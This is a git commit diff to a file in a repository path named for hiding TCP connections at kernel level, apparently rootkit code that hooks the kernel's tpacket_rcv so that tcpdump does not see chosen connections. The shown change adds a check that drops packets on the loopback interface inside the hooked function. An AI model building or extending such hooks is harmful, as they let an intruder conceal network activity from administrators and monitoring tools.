2db6222540d1d3a7c33b93ec119615a5c0ad6b5c
Atharva Tiwari <80307553+iurjscsi1101500@users.noreply.github.com>
2025-06-14 20:08:01 +0530

    add support for tcpdump
    add support for tcpdump by hooking tpacket_rcv

--- Ring0/Hiding-TCP-connections/netstat.c
+++ Ring0/Hiding-TCP-connections/netstat.c
@@ -27,6 +27,10 @@ static int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	struct ipv6hdr *ip6h;
 	struct tcphdr *tcph;
 
+	//for some reason loopback interface causes some crashes so just drop it
+	if (!strncmp(dev->name, "lo", 2))
+		return NET_RX_DROP;
+
 	if (skb_linearize(skb)) goto out;
 
 	if (skb->protocol == htons(ETH_P_IP)) {
